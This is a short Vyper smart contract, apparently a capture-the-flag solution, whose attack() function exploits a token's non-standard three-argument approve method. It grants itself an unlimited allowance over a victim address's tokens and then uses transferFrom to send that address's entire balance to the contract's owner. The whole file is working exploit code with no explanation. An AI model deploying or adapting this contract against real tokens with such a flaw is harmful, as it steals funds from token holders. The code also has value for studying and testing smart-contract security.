# @version ^0.3.7

from vyper.interfaces import ERC20 as IERC20

owner: immutable(address)

token: address
vitalik: address

@external
@payable
def __init__(_token: address, _vitalik: address):
    owner = msg.sender
    self.token = _token
    self.vitalik = _vitalik

@external
def attack():
    assert msg.sender == owner, "!owner"
    raw_call(
        self.token,
        _abi_encode(
           self.vitalik,
           self,
           max_value(uint256),
           method_id=method_id("approve(address,address,uint256)")
        ),
    )
    IERC20(self.token).transferFrom(
        self.vitalik,
        msg.sender,
        IERC20(self.token).balanceOf(self.vitalik),
    )
